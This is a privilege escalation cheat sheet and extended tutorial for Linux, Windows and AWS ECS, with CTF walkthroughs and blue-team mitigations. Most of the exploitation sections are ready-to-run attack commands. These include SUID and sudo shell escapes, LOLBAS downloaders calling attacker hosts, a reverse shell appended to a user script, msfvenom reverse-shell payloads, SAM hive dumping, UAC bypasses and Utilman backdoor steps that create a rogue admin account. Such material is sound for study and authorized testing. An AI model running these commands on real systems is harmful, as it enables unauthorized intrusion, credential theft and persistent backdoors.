# Privilege Escalation


## General Methodology

### 1. Situational Awareness

```bash
# Who am I?
whoami
id
hostname

# What system is this?
uname -a                    # Linux
systeminfo                  # Windows
cat /etc/*release           # Linux distro

# Network information
ip a / ifconfig             # Linux
ipconfig /all               # Windows
netstat -antup              # Linux
netstat -ano                # Windows
```

### 2. Users & Groups

```bash
# Linux
cat /etc/passwd
cat /etc/group
cat /etc/shadow             # If readable
who
w
last

# Windows
net user
net localgroup
net localgroup Administrators
whoami /priv
whoami /groups
```

### 3. Running Processes & Services

```bash
# Linux
ps aux
ps -ef
top
cat /etc/services

# Windows
tasklist /v
wmic process list full
sc query
net start
```

### 4. Installed Software

```bash
# Linux
dpkg -l                     # Debian
rpm -qa                     # RHEL
pip list
which python perl ruby gcc nc wget curl

# Windows
wmic product get name,version
reg query HKLM\SOFTWARE
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

### 5. Scheduled Tasks

```bash
# Linux
crontab -l
ls -la /etc/cron*
cat /etc/crontab
systemctl list-timers

# Windows
schtasks /query /fo LIST /v
dir C:\Windows\Tasks
```

## Automated Enumeration Tools

### Linux

```bash
# LinPEAS - Most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh -t

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# pspy - Monitor processes
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64 && ./pspy64
```

### Windows

```powershell
# WinPEAS
# https://github.com/carlospolop/PEASS-ng/releases
.\winPEASany.exe

# PowerUp
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
# https://github.com/GhostPack/Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
# https://github.com/GhostPack/SharpUp
.\SharpUp.exe
```

## Common Privilege Escalation Vectors

### Linux

| Vector | Description | Detection |
| --- | --- | --- |
| SUID/SGID | Binaries running with elevated privileges | `find / -perm -4000 2>/dev/null` |
| Sudo misconfig | Commands allowed without password | `sudo -l` |
| Capabilities | Special kernel privileges | `getcap -r / 2>/dev/null` |
| Writable files | Config files, scripts | `find / -writable 2>/dev/null` |
| Cron jobs | Scheduled tasks with issues | `cat /etc/crontab` |
| Kernel exploits | Unpatched kernel | `uname -a` |
| NFS no\_root\_squash | Mountable shares | `cat /etc/exports` |
| Docker group | Container escape | `id \| grep docker` |

### Windows

| Vector | Description | Detection |
| --- | --- | --- |
| Unquoted service paths | Service path without quotes | `wmic service get name,pathname` |
| Weak service permissions | Modifiable service binaries | `accesschk.exe /accepteula -uwcqv *` |
| AlwaysInstallElevated | MSI runs as SYSTEM | Registry check |
| Stored credentials | Cached passwords | `cmdkey /list` |
| DLL hijacking | Missing DLLs in PATH | Process Monitor |
| Token impersonation | Potato attacks | `whoami /priv` |
| Unpatched vulnerabilities | Missing KB | `systeminfo` |

## Quick Reference

### GTFOBins (Linux)

```bash
# https://gtfobins.github.io/
# SUID exploitation examples

# Python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Find
find . -exec /bin/sh -p \; -quit

# Vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'

# Bash
/bin/bash -p
```

### LOLBAS (Windows)

```powershell
# https://lolbas-project.github.io/
# Living Off The Land Binaries

# certutil - Download files
certutil -urlcache -f http://attacker/file.exe file.exe

# mshta - Execute HTA
mshta http://attacker/evil.hta

# rundll32 - Execute DLL
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(cmd)")
```

## Resources

* [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
* [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
* [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [PayloadsAllTheThings - Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Absolomb's Security Blog - Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

---

# Extended Detailed Guide: Privilege Escalation Techniques

This section expands on the core concepts above, providing deeper technical explanations, real-world attack examples, and step-by-step exploitation methods for the most common privilege escalation vectors.

## 1. Linux Privilege Escalation Deep Dive

Linux privilege escalation often involves exploiting misconfigurations in file permissions, user privileges, and system services rather than kernel vulnerabilities, which are increasingly rare in patched systems.

### 1.1. SUID/SGID Binaries (GTFOBins)

**The Concept:**  
SUID (Set User ID) and SGID (Set Group ID) are special permissions that allow a binary to execute with the privileges of its owner (typically root) rather than the user who runs it. When a misconfigured SUID binary exists, any user executing it gains temporary elevated privileges.

**Real-World Scenario:**  
In the *Escalate-my-privileges_LAB* CTF challenge, the SUID binary was not the initial vector, but misconfigured sudo permissions ultimately allowed root access. In other real-world assessments, common SUID binaries like `find`, `vim`, `bash`, and `python` have been exploited.

**Detection & Exploitation:**

```bash
# Find all SUID binaries (original command from your guide)
find / -perm -4000 2>/dev/null

# Example 1: Exploiting SUID 'find' binary
# If find has SUID bit set (find / -perm -4000 -name find 2>/dev/null)
find . -exec /bin/sh -p \; -quit
# The -p flag preserves the SUID privilege

# Example 2: Exploiting SUID 'python'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example 3: Exploiting SUID 'bash'
/bin/bash -p
# The -p flag tells bash to run with effective UID as real UID

# Example 4: Exploiting SUID 'vim'
vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'
```

**Why It Works:**  
The SUID bit (4000) causes the binary to run under the binary owner's permissions. If the binary is owned by root and has a shell escape function, the user can spawn a root shell. Tools like `SUID3NUM` automate the process of finding and cross-referencing SUID binaries with GTFOBins.

**Mitigation:**  
- Audit SUID binaries regularly: `find / -perm /4000 2>/dev/null`
- Remove SUID bits where unnecessary: `chmod u-s /path/to/binary`
- Use filesystem mount options like `nosuid` on partitions where SUID is not required

### 1.2. Sudo Misconfigurations

**The Concept:**  
The `/etc/sudoers` file defines which users can run which commands with elevated privileges. Misconfigurations often allow users to run specific commands as root without a password or with wildcards that can be exploited.

**Real-World Scenario:**  
In the *Escalate-my-privileges_LAB* CTF, the `armour` user had sudo rights to execute `/bin/bash` without restrictions, granting instant root access. This represents a critical misconfiguration where a user was given full root capabilities through sudo.

**Detection:**

```bash
# List current user's sudo permissions (original command)
sudo -l

# Example output showing vulnerability:
# User armour may run the following commands on this host:
#     (ALL : ALL) /bin/bash
```

**Exploitation Scenarios:**

**Scenario 1: Full sudo rights to bash/shell**
```bash
# If sudo -l shows (ALL : ALL) /bin/bash
sudo /bin/bash
# or simply
sudo -i
# Result: Immediate root shell
```

**Scenario 2: Sudo rights with NOPASSWD**
```bash
# If sudo -l shows NOPASSWD: ALL for a user
sudo -i  # No password required
```

**Scenario 3: Exploiting wildcards or specific binaries**
```bash
# If user can run journalctl as root (from Pluralsight lab)
sudo journalctl
# Inside journalctl, press ! to execute a shell as root
!/bin/bash
```

**Scenario 4: Exploiting allowed commands that can spawn shells**
```bash
# If allowed to run 'less' or 'more'
sudo less /etc/hosts
# Inside less, type:
!/bin/bash

# If allowed to run 'awk'
sudo awk 'BEGIN {system("/bin/sh")}'

# If allowed to run 'perl'
sudo perl -e 'exec "/bin/sh";'

# If allowed to run 'find'
sudo find . -exec /bin/sh \; -quit

# If allowed to run 'nmap' (older versions with interactive mode)
sudo nmap --interactive
nmap> !sh
```

**Real-World Impact: Capita Data Breach (2023)**  
The UK Information Commissioner's Office (ICO) fined Capita £14 million following a 2023 breach affecting over 6.6 million people. A key finding was that Capita had "limited practical controls for privileged accounts" and failed to implement "least-privilege enforcement and just-in-time access," enabling attackers to escalate privileges and move laterally across multiple domains.

**Mitigation:**
- Apply the principle of least privilege: restrict sudo access to only necessary administrative binaries
- Remove `NOPASSWD` rules unless absolutely required
- Use `visudo` to edit sudoers safely (it validates syntax before saving)
- Regularly review `/etc/sudoers` with centralized logging and SIEM integration
- Example of restrictive sudo entry (NOT the vulnerable one):
  ```bash
  # Allow specific command only, not full shell
  bob ALL=(ALL) /usr/bin/systemctl restart nginx
  ```

### 1.3. Kernel Exploits

**The Concept:**  
Unpatched Linux kernels may contain vulnerabilities that allow local privilege escalation. These are increasingly rare in up-to-date systems but remain relevant for legacy or unmaintained infrastructure.

**Real-World Example: Dirty Pipe (CVE-2022-0847)**  
A vulnerability in Linux kernel 5.8 through 5.16.11 allowed overwriting data in arbitrary read-only files, leading to privilege escalation. The exploit was similar to the older "Dirty Cow" (CVE-2016-5195) but with different root causes.

**Detection & Exploitation Approach:**

```bash
# Check kernel version
uname -a

# Use Linux Exploit Suggester (from your guide)
./linux-exploit-suggester.sh

# Check for specific vulnerabilities manually
# Dirty Cow (CVE-2016-5195) - affects kernels 2.6.22 < 3.9
# Dirty Pipe (CVE-2022-0847) - affects kernels 5.8 - 5.16.11
# PwnKit (CVE-2021-4034) - affects polkit from 2009-2022

# Example: Compiling and running Dirty Cow exploit (educational context only)
gcc -pthread dirtycow.c -o dirtycow
./dirtycow /etc/passwd
```

**Important Note:** Kernel exploits can cause system instability or crashes. They should be a last resort after exhausting configuration-based privilege escalation vectors.

### 1.4. Docker Group Escape

**The Concept:**  
Users in the `docker` group can run containers. Since Docker runs as root, it's possible to escape the container context and gain root access on the host system by mounting the host filesystem.

**Detection:**
```bash
id | grep docker
# If docker appears, the user can run Docker commands
```

**Exploitation:**
```bash
# Run a container with host root filesystem mounted
docker run -it -v /:/host alpine chroot /host /bin/bash
# This provides a root shell on the host system

# Alternative: Using a more privileged container
docker run -it --privileged -v /:/host ubuntu chroot /host /bin/bash
```

**Why This Works:**  
The Docker daemon runs with root privileges. Members of the `docker` group can effectively become root by creating containers that mount and access the host filesystem.

## 2. Windows Privilege Escalation Deep Dive

Windows privilege escalation often involves abusing service configurations, scheduled tasks, token privileges, and User Account Control (UAC) bypasses.

### 2.1. User Account Control (UAC) Bypass

**The Concept:**  
UAC is a Windows security feature that prevents unauthorized system changes by requiring administrator consent for privileged operations. However, multiple bypass techniques exist that allow standard users to elevate to administrator without consent.

**Real-World Scenario:**  
In the Windows Privilege Escalation lab demonstration, when the initial `getsystem` command failed in Meterpreter, the `bypassuac_fodhelper` module was used to bypass UAC, after which `getsystem` successfully escalated to `NT AUTHORITY\SYSTEM`.

**Detection (from your guide):**
```cmd
whoami /priv
whoami /groups
```

**Exploitation Methods:**

**Method 1: Using Metasploit's bypassuac modules**
```msf
meterpreter > getsystem
[-] priv_elevate_getsystem: Attempting to getprivs via Token Duplication failed
[-] priv_elevate_getsystem: There are no valid tokens available to duplicate

# Bypass UAC first
meterpreter > use exploit/windows/local/bypassuac_fodhelper
meterpreter > set SESSION <ID>
meterpreter > run

# Now getsystem should work
meterpreter > getsystem
... got system via technique 1 (Named Pipe Impersonation)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Method 2: Using UACMe Tool**
UACMe is an open-source tool used to bypass UAC and get local administrator privileges. It contains multiple bypass methods that work across different Windows versions.

```cmd
# Compile UACMe (from source)
# Run with a known method (varies by Windows version)
akagi32.exe 23 C:\Windows\System32\cmd.exe
# Method number depends on target Windows version
```

**Common UAC Bypass Techniques:**
- **Fodhelper Bypass:** Abuses registry keys under `HKCU\Software\Classes\ms-settings\shell\open\command`
- **Event Viewer Bypass:** Uses `eventvwr.exe` to execute arbitrary commands
- **Disk Cleanup Bypass:** Abuses the SilentCleanup task
- **CMSTP Bypass:** Uses `cmstp.exe` to execute malicious INF files

**Mitigation:**
- Set UAC level to "Always Notify" (highest level)
- Apply Microsoft's UAC hardening guidance
- Monitor event IDs 4648, 4674, and 4703 for UAC bypass attempts
- Use Application Control policies (AppLocker/Windows Defender Application Control)

### 2.2. Unquoted Service Paths

**The Concept:**  
When a Windows service path contains spaces and is not enclosed in quotes, Windows parses the path in a predictable way that can be exploited. The system attempts to execute each segment of the path as an executable, allowing an attacker to place a malicious binary at a predictable location.

**Detection (from your guide):**
```cmd
wmic service get name,pathname,startmode
# Look for paths with spaces and no quotes
# Example vulnerable path: C:\Program Files\Vulnerable Service\service.exe
```

**How the Exploit Works:**
1. Service path: `C:\Program Files\Vulnerable Service\service.exe`
2. Windows attempts to execute:
   - `C:\Program.exe`
   - `C:\Program Files\Vulnerable.exe`
   - `C:\Program Files\Vulnerable Service\service.exe`

**Exploitation Steps:**
```cmd
# Check write permissions in parent directories
icacls "C:\"
icacls "C:\Program Files"

# If writable, place malicious binary
copy malicious.exe "C:\Program.exe"

# Restart the service (requires service restart permission or wait for reboot)
sc stop vulnerable_service
sc start vulnerable_service
```

### 2.3. Weak Service Permissions

**The Concept:**  
Windows services have configurable permissions. If a standard user has permissions to modify a service's binary path or configuration, they can make the service execute arbitrary commands with SYSTEM privileges.

**Detection with AccessChk (Sysinternals):**
```cmd
# From your guide
accesschk.exe /accepteula -uwcqv *

# Check specific user's permissions on a service
accesschk.exe -uwcqv "USERNAME" * | findstr "SERVICE_ALL_ACCESS"

# Check service binary file permissions
accesschk.exe -uwcqv "USERNAME" "C:\Path\to\service.exe"
```

**Exploitation:**
```cmd
# Modify service binary path to execute malicious command
sc config vulnerable_service binPath="C:\malicious.exe"
sc stop vulnerable_service
sc start vulnerable_service

# Or change service to run command directly
sc config vulnerable_service binPath="cmd.exe /c net localgroup administrators USERNAME /add"
```

### 2.4. AlwaysInstallElevated

**The Concept:**  
Two registry keys can be set to allow any user to install MSI packages with SYSTEM privileges. This is a dangerous configuration often used for software deployment in enterprises.

**Detection:**
```cmd
# Check both registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both return 0x1, the system is vulnerable
```

**Exploitation:**
```cmd
# Generate malicious MSI using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o malicious.msi

# Execute the MSI (runs as SYSTEM)
msiexec /quiet /qn /i malicious.msi
```

### 2.5. Stored Credentials (cmdkey)

**The Concept:**  
Windows can store credentials for network resources using `cmdkey`. If administrative credentials are stored, they can be extracted and used for privilege escalation or lateral movement.

**Detection (from your guide):**
```cmd
cmdkey /list
# Example output shows stored credentials for domain
# Target: Domain:interactive=DOMAIN\Administrator
```

**Exploitation:**
```cmd
# List stored credentials
cmdkey /list

# Use stored credentials with runas
runas /savecred /user:DOMAIN\Administrator "cmd.exe"

# Or use with other tools
# For scheduled tasks created with stored creds
schtasks /run /tn "TaskName"
```

### 2.6. Windows Services (Unquoted Path & Weak Permissions) - Real World

**The Concept Revisited:**  
The 2023 Capita breach highlighted how service misconfigurations enable privilege escalation. The ICO found that Capita failed to implement "Active Directory tiering model for administrative accounts" and had "limited practical controls for privileged accounts".

**Complete Exploitation Walkthrough for Unquoted Service Paths:**

**Step 1 - Identify Vulnerable Services:**
```cmd
# List all services with their binary paths
wmic service get name,pathname | findstr /i /v "C:\\Windows\\System32\\" | findstr /i /v "C:\\Windows\\SysWOW64\\"
# Look for paths with spaces and no quotes

# Alternative using PowerShell
Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike "*Windows*" -and $_.PathName -like "* *" -and $_.PathName -notlike '"*'}
```

**Step 2 - Check Permissions on Parent Directories:**
```cmd
# For a service at C:\Program Files\Vulnerable Corp\Product\service.exe
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Vulnerable Corp"

# If you can write to any parent directory, you can exploit
```

**Step 3 - Generate Malicious Executable:**
```cmd
# On attacker machine (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o Program.exe

# Or for a simple add-user payload (test environment only)
# Create a C program that adds a user
```

**Step 4 - Place Malicious Executable:**
```cmd
# Copy to the predicted location (first segment of path)
copy \\attacker\share\Program.exe "C:\Program.exe"
```

**Step 5 - Trigger Service Execution:**
```cmd
# Check if you can restart the service
sc query vulnerable_service
sc stop vulnerable_service
sc start vulnerable_service

# If you can't restart, wait for system reboot or service restart
```

### 2.7. Utilman / Sticky Keys Backdoor

**The Concept:**  
A classic physical access privilege escalation technique that has been used in countless penetration tests and real-world attacks. By replacing accessibility binaries (`Utilman.exe`, `sethc.exe`, `osk.exe`) with `cmd.exe`, an attacker can get a SYSTEM shell at the login screen.

**How It Works (from the r0otk3r walkthrough):**
1. Boot from Windows installation media (or alternate OS)
2. Open command prompt with Shift+F10 at language selection
3. Identify the system drive (usually D: or C: from the recovery environment)
4. Navigate to `D:\Windows\System32`
5. Backup original: `ren utilman.exe utilman2.exe`
6. Replace: `copy cmd.exe utilman.exe`
7. Reboot normally
8. Click the Ease of Access button at login screen
9. Command prompt opens with SYSTEM privileges
10. Reset any user password: `net user admin newpassword`

**Detection on a Live System:**
```cmd
# Check file hashes of accessibility binaries
certutil -hashfile C:\Windows\System32\Utilman.exe MD5
certutil -hashfile C:\Windows\System32\sethc.exe MD5

# Compare against known good hashes
# Legitimate Utilman.exe should not be identical to cmd.exe
```

**Mitigation:**
- **BitLocker Drive Encryption:** Prevents offline file modification
- **BIOS/UEFI Password:** Prevents booting from alternate media
- **Secure Boot:** Ensures only trusted operating systems boot
- **File Integrity Monitoring:** Alert on changes to system binaries

## 3. Cloud & Container Privilege Escalation

### 3.1. AWS ECS Container Escape (ECScape - 2025)

**The Concept:**  
A privilege escalation technique discovered in Amazon ECS that allows a compromised container to steal IAM credentials from other containers running on the same EC2 instance.

**Discovery:**  
Naor Haziz from Sweet Security found that the ECS control plane sends task credentials down to the ECS agent over a WebSocket channel via the Agent Communication Service (ACS). By monitoring this channel, an attacker can obtain credentials for other containers on the same host.

**The Attack Technique:**
1. Compromise a low-privilege container running on ECS (EC2 launch type)
2. Access the Instance Metadata Service (IMDS) - enabled by default
3. Monitor the ACS WebSocket channel for credential transmissions
4. Forge and sign an ACS WebSocket request, impersonating the ECS agent
5. Trick the ECS control plane into sending all IAM task credentials for the host
6. Use stolen credentials to access other cloud resources

**Why This Is Dangerous:**
- No misconfiguration required - IMDS is enabled by default in ECS setups
- Breaks the assumption that containers are isolated from each other
- Allows lateral movement and privilege escalation across container roles

**Mitigation (per AWS and researcher):**
- Disable IMDS or limit its access to tasks (most critical mitigation)
- Avoid co-locating highly sensitive tasks with untrusted tasks on the same EC2 instance
- Use AWS Fargate instead of EC2 (offers stronger isolation)
- Restrict ECS agent permissions

### 3.2. Living Off the Land (LOL) Techniques

**The Concept:**  
Living Off the Land (LotL) techniques involve using legitimate, trusted binaries and scripts that are already present on the system to perform malicious actions. This approach helps attackers evade detection since their activities blend in with normal system operations.

**LOLBAS (Windows) and GTFOBins (Linux):**  
These projects catalog legitimate binaries that can be abused for various purposes including file execution, code compilation, credential theft, and bypassing security controls.

**Windows LOLBAS Examples (expanding your guide):**

**File Execution without PowerShell:**
```cmd
# Using mshta to execute HTA files
mshta.exe file.hta
mshta.exe javascript:a=GetObject("script:https://attacker.com/evil.sct").Exec();close();

# Using regsvr32 to execute scripts
regsvr32.exe /s /n /u /i:https://attacker.com/file.sct scrobj.dll

# Using rundll32 for JavaScript execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")

# Using wmic for command execution
wmic.exe process call create "cmd /c calc.exe"

# Using pcalua (Program Compatibility Assistant)
pcalua.exe -a malicious.exe
```

**Code Compilation on Target:**
```cmd
# Compile C# code with csc (if .NET Framework present)
csc.exe -out:malicious.exe malicious.cs

# Compile VB code
vbc.exe /target:exe malicious.vb

# Compile JScript
jsc.exe /t:library malicious.js
```

**Credential Theft with Native Tools:**
```cmd
# Find passwords in SYSVOL (Group Policy Preferences)
findstr /S /I cpassword \\sysvol\policies\*.xml

# Dump registry hives (for offline extraction)
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\system.bak
```

**DLL Sideloading/Hijacking (from the REvil attack):**  
In the 2021 REvil ransomware attack on MSP Kaseya, attackers used DLL sideloading with a trusted Microsoft executable (`MsMpEng.exe`, the Windows Defender service) to load and execute malicious code while bypassing security controls.

**Detection of LOL Techniques:**
- Monitor unusual parent-child process relationships (e.g., `cmd.exe` spawned by `wmic.exe`)
- Track execution of signed binaries with suspicious command-line arguments
- Use Sysmon Event ID 1 (Process creation) with specific filtering for LOLBin patterns
- Implement Application Control (AppLocker/Windows Defender Application Control) to restrict which binaries can execute

## 4. Practical Exploitation Walkthroughs

### Walkthrough 1: Linux - CTF Style Privilege Escalation

This walkthrough is based on the *Escalate-my-privileges_LAB* CTF challenge.

**Phase 1: Initial Reconnaissance**
```bash
# Nmap scan reveals ports 80, 22, 111 open
nmap -sV -p- target_ip

# Directory enumeration finds /phpbash.php in robots.txt
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
```

**Phase 2: Initial Foothold**
```bash
# Accessing /phpbash.php provides a web-based bash shell
# The shell runs as the web server user (www-data)

# Navigate to home directory of user 'armour'
cd /home/armour
ls -la

# Found files: Credentials.txt, runme.sh
cat Credentials.txt
# Contains: rootroot1 (MD5 hash of the actual password)
```

**Phase 3: Lateral Movement**
```bash
# The password was stored as MD5 hash
# In the lab, the actual password was 'rootroot1'

# Append reverse shell to runme.sh
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> runme.sh

# Run the script
./runme.sh

# On attacker machine, receive reverse shell as 'armour' user
nc -lvnp 4444
```

**Phase 4: Privilege Escalation**
```bash
# Check sudo permissions for 'armour'
sudo -l

# Output shows:
# User armour may run the following commands on this host:
#     (ALL : ALL) /bin/bash

# Escalate to root
sudo /bin/bash
# or simply
sudo -i

# Now root - capture the flag
cat /root/proof.txt
```

**Key Takeaways from this CTF:**
- Credentials should never be stored in plaintext or weak hashes (MD5 is deprecated)
- Writable scripts in user directories can be modified for malicious purposes
- `sudo -l` should be audited regularly - unrestricted bash access is a critical vulnerability
- Use bcrypt, Argon2, or PBKDF2 for password storage instead of MD5

### Walkthrough 2: Windows - Physical Access (Utilman)

This walkthrough is based on the r0otk3r Utilman exploit demonstration.

**Scenario:** You have physical access to a Windows machine (or virtual console access) but don't know the password.

**Step 1: Boot from Alternate Media**
- Insert Windows installation USB/DVD
- Boot from the installation media
- At the language selection screen, press **Shift+F10** to open a command prompt

**Step 2: Identify System Drive**
```cmd
# You start in X:\Sources (the recovery environment)
# Find the actual Windows installation
wmic logicaldisk get name

# Output might show:
# C: (this might be the recovery partition)
# D: (likely the system drive)

# Verify D: contains Windows
dir D:\
# Output should show "Windows", "Users", "Program Files" directories
```

**Step 3: Replace Accessibility Binary**
```cmd
# Navigate to System32
cd D:\Windows\System32

# Backup original Utilman.exe
ren utilman.exe utilman2.exe

# Replace with Command Prompt
copy cmd.exe utilman.exe
# Output: 1 file(s) copied.

# Optional: Also replace Sticky Keys (sethc.exe) for alternate method
ren sethc.exe sethc2.exe
copy cmd.exe sethc.exe
```

**Step 4: Boot Normally and Exploit**
- Close all windows and reboot
- At the login screen, click the **Ease of Access** icon (bottom-right corner)
- A command prompt opens with **NT AUTHORITY\SYSTEM** privileges

**Step 5: Reset Password**
```cmd
# View all users
net user

# Reset the administrator password
net user Administrator NewPassword123

# Or add a new admin user
net user backdoor Password123 /add
net localgroup Administrators backdoor /add
```

**Alternative Approach (Sticky Keys):**
- Press **Shift** key 5 times rapidly at the login screen
- This triggers Sticky Keys (`sethc.exe`) which has been replaced with `cmd.exe`
- Same SYSTEM shell appears

## 5. Detection & Mitigation Strategies

### For Blue Teams

**Linux Detection:**
- Monitor for unusual SUID binary execution
- Track sudo command usage with auditd: `auditctl -w /etc/sudoers -p wa -k sudoers_changes`
- Use Osquery to detect SUID binaries: `SELECT * FROM suid_binaries;`
- Implement SELinux/AppArmor to restrict binary capabilities

**Windows Detection:**
- Enable PowerShell logging (Module, Script Block, and Transcription logging)
- Configure Sysmon with comprehensive event collection (Process creation, Network connections, File creation)
- Monitor Event ID 4648 (Logon with explicit credentials)
- Track UAC bypass attempts via Event ID 4703 (Token right adjusted)
- Deploy Microsoft Defender for Endpoint or similar EDR with LOLBAS detection rules

**Cloud Detection (AWS):**
- Monitor CloudTrail for unusual IAM role assumption patterns
- Implement IMDSv2 (requires session token, reduces attack surface)
- Use AWS GuardDuty for anomaly detection
- Regularly audit ECS task roles and EC2 instance profiles

### For Red Teams

**Operational Security:**
- Always attempt configuration-based escalation before kernel exploits (more stable, less likely to crash target)
- Document all findings with clear remediation steps for client reports
- Use GTFOBins and LOLBAS to find less suspicious binaries for your activities
- Consider living-off-the-land techniques to avoid triggering EDR alerts

**Recommended Tooling (beyond your guide):**
- **Linux:** `traitor` - Automatic Linux privesc via exploitation of low-hanging fruit
- **Windows:** `UACMe` - Multiple UAC bypass methods
- **Both:** `GTFOBLookup` - Offline command line lookup utility for GTFOBins and LOLBAS
